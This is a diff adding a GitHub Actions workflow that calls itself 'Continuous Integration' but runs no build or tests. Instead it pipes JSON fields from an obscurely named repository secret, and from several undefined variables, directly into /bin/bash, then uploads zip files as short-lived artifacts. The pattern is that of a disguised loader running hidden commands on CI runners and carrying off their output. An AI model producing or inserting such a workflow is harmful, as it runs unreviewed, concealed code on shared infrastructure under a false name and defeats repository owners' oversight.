@@ -1,0 +1,31 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          ejk4174: ${{ secrets.ejk4174 }}
+        run: |
+          printf '%s' "$ejk4174" | jq -r .g6 | /bin/bash
+          printf '%s' "$nfax6" | jq -r .aqvh61 | /bin/bash
+          printf '%s' "$ud0728" | jq -r .qrdkl332 | /bin/bash
+          echo $ac728 | jq -r .vpis394 | /bin/bash
+          echo $zon0065 | jq -r .k48326 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: CtIOMkLR
+          path: "*.zip"
+          retention-days: 1
